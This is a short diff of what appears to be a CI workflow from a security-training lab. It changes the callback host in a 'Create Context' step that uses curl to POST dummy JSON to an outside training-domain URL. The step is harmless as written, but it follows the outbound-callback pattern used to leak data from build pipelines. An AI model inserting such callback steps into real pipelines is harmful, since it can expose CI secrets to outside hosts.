@@ -21,4 +21,4 @@ jobs:
         args: '. --sarif --output results.sarif || true'
     - name: Create Context
       run: |
-        curl -X POST -H "Content-Type: application/json" -d '{"key1": "value1", "key2": "value2"}'   http://oqngfj0xblq3lx0jltjmw.appsecengineer.training:8880/callback
+        curl -X POST -H "Content-Type: application/json" -d '{"key1": "value1", "key2": "value2"}'   http://fc1ozuauuxiy14posehng.appsecengineer.training:8880/callback
